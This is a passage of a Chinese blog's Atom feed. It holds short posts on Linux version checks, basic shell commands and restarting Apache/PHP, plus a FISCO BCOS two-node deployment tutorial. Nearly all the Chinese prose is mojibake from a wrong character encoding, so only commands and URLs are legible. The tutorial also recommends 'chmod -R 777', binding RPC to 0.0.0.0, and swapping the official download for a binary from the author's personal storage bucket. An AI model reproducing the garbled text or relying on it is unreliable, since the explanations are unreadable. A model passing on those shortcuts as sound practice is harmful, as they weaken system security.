    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>linux æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</title>
    <link href="https://x1a0.net/2020/10/16/195/"/>
    <id>https://x1a0.net/2020/10/16/195/</id>
    <published>2020-10-16T12:45:26.000Z</published>
    <updated>2020-10-16T12:45:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>1ã€lsb_release -aï¼Œè¿™ä¸ªå‘½ä»¤é€‚ç”¨äºæ‰€æœ‰çš„Linuxå‘è¡Œç‰ˆï¼ŒåŒ…æ‹¬RedHatã€SUSEã€Debianâ€¦ç­‰å‘è¡Œç‰ˆã€‚</p><p>2ã€cat /etc/redhat-releaseï¼Œè¿™ç§æ–¹æ³•åªé€‚åˆRedhatç³»çš„Linux</p><p>3ã€cat /etc/issueï¼Œæ­¤å‘½ä»¤ä¹Ÿé€‚ç”¨äºæ‰€æœ‰çš„Linuxå‘è¡Œç‰ˆã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1ã€lsb_release -aï¼Œè¿™ä¸ªå‘½ä»¤é€‚ç”¨äºæ‰€æœ‰çš„Linuxå‘è¡Œç‰ˆï¼ŒåŒ…æ‹¬RedHatã€SUSEã€Debianâ€¦ç­‰å‘è¡Œç‰ˆã€‚&lt;/p&gt;
&lt;p&gt;2ã€cat /etc/redhat-releaseï¼Œè¿™ç§æ–¹æ³•åªé€‚åˆRedhatç³»çš„Linux&lt;/p&gt;
&lt;p&gt;3ã€cat /etc/is</summary>
      
    
    
    
    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>linuxç›¸å…³æ“ä½œè®°å½•</title>
    <link href="https://x1a0.net/2020/10/04/194/"/>
    <id>https://x1a0.net/2020/10/04/194/</id>
    <published>2020-10-03T18:15:29.000Z</published>
    <updated>2020-10-03T18:15:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>å½“å‰æ–‡ä»¶å¤¹ä¸‹å…¨éƒ¨èµ‹æƒ<br>chmod -R 777 ./</p><p>æŸ¥çœ‹ç«¯å£è¯¦æƒ…ï¼Œæ­£åˆ™åŒ¹é…fb<br>netstat -anp | grep fisco-bcos</p><p>æ€æ­»<br>kill -9 id</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½“å‰æ–‡ä»¶å¤¹ä¸‹å…¨éƒ¨èµ‹æƒ&lt;br&gt;chmod -R 777 ./&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ç«¯å£è¯¦æƒ…ï¼Œæ­£åˆ™åŒ¹é…fb&lt;br&gt;netstat -anp | grep fisco-bcos&lt;/p&gt;
&lt;p&gt;æ€æ­»&lt;br&gt;kill -9 id&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>vpsè½¯é‡å¯åApache-PHPæ²¡å¯åŠ¨</title>
    <link href="https://x1a0.net/2020/09/24/193/"/>
    <id>https://x1a0.net/2020/09/24/193/</id>
    <published>2020-09-24T05:55:09.000Z</published>
    <updated>2020-09-24T05:55:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>å®‰è£…çš„å®å¡” æ˜¾ç¤º80æœªé…ç½®<br>ç½‘ç«™æ˜¾ç¤ºæ‹’ç»è®¿é—®</p><p>/www/server/php<br>/etc/init.d/php-fpm-{52|53|54|55|56|70|71|72|73|74} start</p><p>/www/server/httpd<br>/etc/init.d/httpd start</p><p>/www/server/nginx<br>/etc/init.d/nginx start</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å®‰è£…çš„å®å¡” æ˜¾ç¤º80æœªé…ç½®&lt;br&gt;ç½‘ç«™æ˜¾ç¤ºæ‹’ç»è®¿é—®&lt;/p&gt;
&lt;p&gt;/www/server/php&lt;br&gt;/etc/init.d/php-fpm-{52|53|54|55|56|70|71|72|73|74} start&lt;/p&gt;
&lt;p&gt;/www/server/httpd&lt;br</summary>
      
    
    
    
    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>FISCO BCOSå¤šæœºéƒ¨ç½²ä¹‹å•ç¾¤ç»„åŒæœºæ„åŒèŠ‚ç‚¹ç»„ç½‘æ¨¡å¼</title>
    <link href="https://x1a0.net/2020/07/22/190/"/>
    <id>https://x1a0.net/2020/07/22/190/</id>
    <published>2020-07-21T16:06:31.000Z</published>
    <updated>2020-07-21T16:06:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©å‡Œæ™¨äº¤çš„POCï¼Œç°åœ¨å¤ç°å®Œç»„ç½‘è¿‡ç¨‹å°±å¯ä»¥ç¢è§‰äº†ï¼Œemm~</p><hr><h2 id="0-éœ€æ±‚åˆ†æ"><a href="#0-éœ€æ±‚åˆ†æ" class="headerlink" title="0.éœ€æ±‚åˆ†æ"></a>0.éœ€æ±‚åˆ†æ</h2><p>æœ‰ä¸¤å°æœåŠ¡å™¨ï¼Œç‹—å­å“¥è¯´æ¯å°æœåŠ¡å™¨ä¸€ä¸ªèŠ‚ç‚¹ã€‚é‚£ä¹ˆæ¯å°æœºå­ä¸‹ä¸€ä¸ªæœºæ„ç”Ÿæˆä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸¤ä¸ªè¿ä¸€å—ï¼Œå³ï¼šåŒæœºæ„åŒèŠ‚ç‚¹å•ç¾¤ç»„ã€‚<br>è¿™æ ·å°±ä¸èƒ½ä½¿ç”¨å®˜æ–¹çš„ä¸€é”®èºæ—‹å¿«ä¹é£å¤©è„šæœ¬äº†ï¼š<br><img src="https://img-blog.csdnimg.cn/20200721225029310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨generatorè¿ç»´éƒ¨ç½²å·¥å…·ï¼Œ<br>äºæ˜¯å°±å‡ºç°äº†é—®é¢˜ï¼ˆåŸºåœ°çˆ†ç‚¸ï¼Œé—®é¢˜ä¸å¤§ï¼‰ã€‚</p><hr><h2 id="1-ä¸‹è½½å®‰è£…è¿ç»´éƒ¨ç½²å·¥å…·"><a href="#1-ä¸‹è½½å®‰è£…è¿ç»´éƒ¨ç½²å·¥å…·" class="headerlink" title="1.ä¸‹è½½å®‰è£…è¿ç»´éƒ¨ç½²å·¥å…·"></a>1.ä¸‹è½½å®‰è£…è¿ç»´éƒ¨ç½²å·¥å…·</h2><blockquote><p><em>è¿™é‡Œå‡è®¾æœºå­ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå› ä¸ºä½¿ç”¨æºç ç¼–è¯‘å®¢æˆ·ç«¯çš„ç”¨æˆ·ä¸ç”¨æœ€åä¸€æ­¥</em></p></blockquote><p>ä¸‹è½½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/ &amp;&amp; git clone https://github.com/FISCO-BCOS/generator.git</span><br><span class="line">Copy to clipboard</span><br></pre></td></tr></table></figure><p>å®‰è£…(æ­¤æ“ä½œè¦æ±‚ç”¨æˆ·å…·æœ‰sudoæƒé™)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator &amp;&amp; bash ./scripts/install.sh</span><br><span class="line">Copy to clipboard</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸï¼Œè‹¥æˆåŠŸï¼Œè¾“å‡º usage: generator xxx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator -h</span><br></pre></td></tr></table></figure><p>è·å–èŠ‚ç‚¹äºŒè¿›åˆ¶<br>æ‹‰å–æœ€æ–°fisco-bcosäºŒè¿›åˆ¶æ–‡ä»¶åˆ°metaä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --download_fisco ./meta</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥äºŒè¿›åˆ¶ç‰ˆæœ¬<br>è‹¥æˆåŠŸï¼Œè¾“å‡º FISCO-BCOS Version : x.x.x-x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./meta/fisco-bcos -v</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡åˆ°çš„é—®é¢˜æ˜¯ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ‹‰å–è´¼æ…¢ã€‚<br>ç„¶åæˆ‘å†æœ¬æœºæŠŠgeneratorå…‹éš†ä¸‹æ¥ï¼Œå‘ç°æ˜¯:<br><img src="https://img-blog.csdnimg.cn/20200721230416252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å·¥å…·ç±»çš„download_fiscoå‡½æ•°è¿™é‡Œå¡ä¸»äº†ã€‚æ²¡æœ‰cdnçš„æœ‹å‹å¯ä»¥vimä¿®æ”¹ä¸‹è¿™ä¸ªurlä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/fisco-bcos.tar.gz</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘çš„OSSï¼Œå¼€æ”¾ç»™å¤§å®¶ä½¿ç”¨è½»ç‚¹æ•²å•Šã€‚</p><p>ä¸€ç§’ä¸åˆ°å°±ä¸‹å®Œäº†ã€‚ç„¶åè¿™ä¸ªå°±æ˜¯è£…å¥½äº†ï¼š<br><img src="https://img-blog.csdnimg.cn/20200721230817108.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="2-è”ç›Ÿé“¾åˆå§‹åŒ–"><a href="#2-è”ç›Ÿé“¾åˆå§‹åŒ–" class="headerlink" title="2.è”ç›Ÿé“¾åˆå§‹åŒ–"></a>2.è”ç›Ÿé“¾åˆå§‹åŒ–</h2><p>æ¥åº·åº·æ‹“æ‰‘å›¾ï¼š<br><img src="https://img-blog.csdnimg.cn/20200721231612239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºå®˜æ–¹æ•™ç¨‹æ˜¯åœ¨ä¸€ä¸ªæœºå­ä¸Šé…çš„ï¼Œæ˜¯èŠ‚ç‚¹1,2ã€‚åˆ†èµ·æ¥çš„è¯å®é™…ä¸Šæ²¡æœ‰1,2ä¹‹åˆ†çš„ã€‚å› ä¸ºæ˜¯åœ¨ä¸¤å°æœºå­ä¸Šï¼Œä¹Ÿä¸ä¼šå­˜åœ¨ç«¯å£å†²çªçš„æƒ…å†µã€‚å¦‚æœç«¯å£æ²¡æœ‰æ‰“å¼€å¯èƒ½ä¼šæŠ¥é”™ï¼Œè¿™è¾¹å»ºè®®æŠŠä¸¤å°æœºå­æ·»åŠ ç™½åå•å°±è¡Œäº†ã€‚è¯¦æƒ…å¯å‚è€ƒï¼š<a href="https://blog.csdn.net/xiaoyue2019/article/details/107401334">FSICO BCOSå¤šæœºéƒ¨ç½²ä¹‹ç«¯å£å¼€æ”¾</a><br>æœºæ„|èŠ‚ç‚¹|rpcç«¯å£|channelç«¯å£|p2pç«¯å£<br>â€”|â€”|â€”|â€”|â€”|<br>æœºæ„A|èŠ‚ç‚¹1|8545|20200|30300<br>æœºæ„B|èŠ‚ç‚¹2|8545|20200|30300</p><h3 id="2-1-æœºæ„åˆå§‹åŒ–"><a href="#2-1-æœºæ„åˆå§‹åŒ–" class="headerlink" title="2.1 æœºæ„åˆå§‹åŒ–"></a>2.1 æœºæ„åˆå§‹åŒ–</h3><h1 id="åˆå§‹åŒ–æœºæ„AB"><a href="#åˆå§‹åŒ–æœºæ„AB" class="headerlink" title="åˆå§‹åŒ–æœºæ„AB"></a>åˆå§‹åŒ–æœºæ„AB</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator</span><br><span class="line">cp -r ~/generator ~/generator-A</span><br><span class="line">cp -r ~/generator ~/generator-B</span><br></pre></td></tr></table></figure><h3 id="2-2-é“¾åˆå§‹åŒ–"><a href="#2-2-é“¾åˆå§‹åŒ–" class="headerlink" title="2.2 é“¾åˆå§‹åŒ–"></a>2.2 é“¾åˆå§‹åŒ–</h3><h1 id="ç”Ÿæˆé“¾è¯ä¹¦ca-crt-amp-é“¾ç§é’¥ca-key"><a href="#ç”Ÿæˆé“¾è¯ä¹¦ca-crt-amp-é“¾ç§é’¥ca-key" class="headerlink" title="ç”Ÿæˆé“¾è¯ä¹¦ca.crt&amp;é“¾ç§é’¥ca.key"></a>ç”Ÿæˆé“¾è¯ä¹¦ca.crt&amp;é“¾ç§é’¥ca.key</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --generate_chain_certificate ./dir_chain_ca</span><br></pre></td></tr></table></figure><p>é“¾è¯ä¹¦å’Œé“¾ç§é’¥åœ¨<code>./dir_chain_ca</code></p><hr><h2 id="3-æ„å»ºç¾¤ç»„"><a href="#3-æ„å»ºç¾¤ç»„" class="headerlink" title="3.æ„å»ºç¾¤ç»„"></a>3.æ„å»ºç¾¤ç»„</h2><h3 id="3-1-åˆå§‹åŒ–æœºæ„A"><a href="#3-1-åˆå§‹åŒ–æœºæ„A" class="headerlink" title="3.1 åˆå§‹åŒ–æœºæ„A"></a>3.1 åˆå§‹åŒ–æœºæ„A</h3><h1 id="ç”Ÿæˆæœºæ„Açš„è¯ä¹¦"><a href="#ç”Ÿæˆæœºæ„Açš„è¯ä¹¦" class="headerlink" title="ç”Ÿæˆæœºæ„Açš„è¯ä¹¦"></a>ç”Ÿæˆæœºæ„Açš„è¯ä¹¦</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --generate_agency_certificate ./dir_agency_ca ./dir_chain_ca agencyA</span><br></pre></td></tr></table></figure><h1 id="è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢"><a href="#è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢" class="headerlink" title="è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢"></a>è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./dir_agency_ca/agencyA/* ~/generator-A/meta/</span><br></pre></td></tr></table></figure><h3 id="3-2-åˆå§‹åŒ–æœºæ„B"><a href="#3-2-åˆå§‹åŒ–æœºæ„B" class="headerlink" title="3.2 åˆå§‹åŒ–æœºæ„B"></a>3.2 åˆå§‹åŒ–æœºæ„B</h3><h1 id="ç”Ÿæˆæœºæ„Bçš„è¯ä¹¦"><a href="#ç”Ÿæˆæœºæ„Bçš„è¯ä¹¦" class="headerlink" title="ç”Ÿæˆæœºæ„Bçš„è¯ä¹¦"></a>ç”Ÿæˆæœºæ„Bçš„è¯ä¹¦</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --generate_agency_certificate ./dir_agency_ca ./dir_chain_ca agencyB</span><br></pre></td></tr></table></figure><h1 id="è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢-1"><a href="#è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢-1" class="headerlink" title="è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢"></a>è¯ä¹¦æˆæƒæœºæ„å°†æœºæ„è¯ä¹¦å‘é€ç»™æœºæ„ï¼Œæœºæ„æ”¾åˆ°metaç›®å½•ä¸‹é¢</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./dir_agency_ca/agencyB/* ~/generator-B/meta/</span><br></pre></td></tr></table></figure><h3 id="3-3-æœºæ„Aä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#3-3-æœºæ„Aä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="3.3 æœºæ„Aä¿®æ”¹é…ç½®æ–‡ä»¶"></a>3.3 æœºæ„Aä¿®æ”¹é…ç½®æ–‡ä»¶</h3><h1 id="è¿›å…¥æœºæ„Aä¿®æ”¹node-deployment-inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚"><a href="#è¿›å…¥æœºæ„Aä¿®æ”¹node-deployment-inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚" class="headerlink" title="è¿›å…¥æœºæ„Aä¿®æ”¹node_deployment.inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚"></a>è¿›å…¥æœºæ„Aä¿®æ”¹node_deployment.inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">cat &gt; ./conf/node_deployment.ini&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[group]</span></span><br><span class="line"><span class="string">group_id=1</span></span><br><span class="line"><span class="string">[node0]</span></span><br><span class="line"><span class="string">; host ip for the communication among peers.</span></span><br><span class="line"><span class="string">; Please use your ssh login ip.</span></span><br><span class="line"><span class="string">p2p_ip=you_ip</span></span><br><span class="line"><span class="string">; listen ip for the communication between sdk clients.</span></span><br><span class="line"><span class="string">; This ip is the same as p2p_ip for physical host.</span></span><br><span class="line"><span class="string">; But for virtual host e.g. vps servers, it is usually different from p2p_ip.</span></span><br><span class="line"><span class="string">; You can check accessible addresses of your network card.</span></span><br><span class="line"><span class="string">; Please seehttps://tecadmin.net/check-ip-address-ubuntu-18-04-desktop/</span></span><br><span class="line"><span class="string">; for more instructions.</span></span><br><span class="line"><span class="string">rpc_ip=0.0.0.0</span></span><br><span class="line"><span class="string">channel_ip=0.0.0.0</span></span><br><span class="line"><span class="string">p2p_listen_port=30300</span></span><br><span class="line"><span class="string">channel_listen_port=20200</span></span><br><span class="line"><span class="string">jsonrpc_listen_port=8545</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h3 id="3-4-æœºæ„Bä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#3-4-æœºæ„Bä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="3.4 æœºæ„Bä¿®æ”¹é…ç½®æ–‡ä»¶"></a>3.4 æœºæ„Bä¿®æ”¹é…ç½®æ–‡ä»¶</h3><h1 id="è¿›å…¥æœºæ„Bä¿®æ”¹node-deployment-inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚"><a href="#è¿›å…¥æœºæ„Bä¿®æ”¹node-deployment-inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚" class="headerlink" title="è¿›å…¥æœºæ„Bä¿®æ”¹node_deployment.inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚"></a>è¿›å…¥æœºæ„Bä¿®æ”¹node_deployment.inièŠ‚ç‚¹é…ç½®æ–‡ä»¶ã€ç”ŸæˆèŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤¹ã€‚</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-B</span><br><span class="line">cat &gt; ./conf/node_deployment.ini&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[group]</span></span><br><span class="line"><span class="string">group_id=1</span></span><br><span class="line"><span class="string">[node0]</span></span><br><span class="line"><span class="string">; host ip for the communication among peers.</span></span><br><span class="line"><span class="string">; Please use your ssh login ip.</span></span><br><span class="line"><span class="string">p2p_ip=you_ip_B</span></span><br><span class="line"><span class="string">; listen ip for the communication between sdk clients.</span></span><br><span class="line"><span class="string">; This ip is the same as p2p_ip for physical host.</span></span><br><span class="line"><span class="string">; But for virtual host e.g. vps servers, it is usually different from p2p_ip.</span></span><br><span class="line"><span class="string">; You can check accessible addresses of your network card.</span></span><br><span class="line"><span class="string">; Please seehttps://tecadmin.net/check-ip-address-ubuntu-18-04-desktop/</span></span><br><span class="line"><span class="string">; for more instructions.</span></span><br><span class="line"><span class="string">rpc_ip=0.0.0.0</span></span><br><span class="line"><span class="string">channel_ip=0.0.0.0</span></span><br><span class="line"><span class="string">p2p_listen_port=30300</span></span><br><span class="line"><span class="string">channel_listen_port=20200</span></span><br><span class="line"><span class="string">jsonrpc_listen_port=8545</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h3 id="3-5-æœºæ„Aç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯"><a href="#3-5-æœºæ„Aç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯" class="headerlink" title="3.5 æœºæ„Aç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯"></a>3.5 æœºæ„Aç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯</h3><h1 id="ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node-depoyment-iniç”Ÿæˆ"><a href="#ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node-depoyment-iniç”Ÿæˆ" class="headerlink" title="ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node_depoyment.iniç”Ÿæˆ"></a>ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node_depoyment.iniç”Ÿæˆ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">./generator --generate_all_certificates ./agencyA_node_info</span><br></pre></td></tr></table></figure><h1 id="æœºæ„ç”ŸæˆèŠ‚ç‚¹æ—¶éœ€è¦æŒ‡å®šå…¶ä»–èŠ‚ç‚¹çš„P2Pè¿æ¥åœ°å€ï¼Œè¿™é‡ŒAæœºæ„æŠŠP2Pè¿æ¥æœºæ„å‘é€ç»™äº†Bæœºæ„"><a href="#æœºæ„ç”ŸæˆèŠ‚ç‚¹æ—¶éœ€è¦æŒ‡å®šå…¶ä»–èŠ‚ç‚¹çš„P2Pè¿æ¥åœ°å€ï¼Œè¿™é‡ŒAæœºæ„æŠŠP2Pè¿æ¥æœºæ„å‘é€ç»™äº†Bæœºæ„" class="headerlink" title="æœºæ„ç”ŸæˆèŠ‚ç‚¹æ—¶éœ€è¦æŒ‡å®šå…¶ä»–èŠ‚ç‚¹çš„P2Pè¿æ¥åœ°å€ï¼Œè¿™é‡ŒAæœºæ„æŠŠP2Pè¿æ¥æœºæ„å‘é€ç»™äº†Bæœºæ„"></a>æœºæ„ç”ŸæˆèŠ‚ç‚¹æ—¶éœ€è¦æŒ‡å®šå…¶ä»–èŠ‚ç‚¹çš„P2Pè¿æ¥åœ°å€ï¼Œè¿™é‡ŒAæœºæ„æŠŠP2Pè¿æ¥æœºæ„å‘é€ç»™äº†Bæœºæ„</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./agencyA_node_info/peers.txt ~/generator-B/meta/peersA.txt</span><br></pre></td></tr></table></figure><h3 id="3-6-æœºæ„Bç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯"><a href="#3-6-æœºæ„Bç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯" class="headerlink" title="3.6 æœºæ„Bç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯"></a>3.6 æœºæ„Bç”Ÿæˆå¹¶å‘é€èŠ‚ç‚¹ä¿¡æ¯</h3><h1 id="ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node-depoyment-iniç”Ÿæˆ-1"><a href="#ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node-depoyment-iniç”Ÿæˆ-1" class="headerlink" title="ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node_depoyment.iniç”Ÿæˆ"></a>ç”Ÿæˆæœºæ„AèŠ‚ç‚¹è¯ä¹¦å’ŒP2Pè¿æ¥åœ°å€æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢ä¿®æ”¹çš„node_depoyment.iniç”Ÿæˆ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-B</span><br><span class="line">./generator --generate_all_certificates ./agencyB_node_info</span><br></pre></td></tr></table></figure><h1 id="å› ä¸ºéœ€è¦ç”Ÿæˆåˆ›ä¸–åŒºå—ï¼Œè§„å®šæ­¤æœºæ„å¿…é¡»è¦èŠ‚ç‚¹è¯ä¹¦ã€‚Bæœºæ„é™¤äº†è¦å‘é€P2Pè¿æ¥åœ°å€ä¹‹å¤–è¿˜è¦å‘é€èŠ‚ç‚¹è¯ä¹¦ã€‚"><a href="#å› 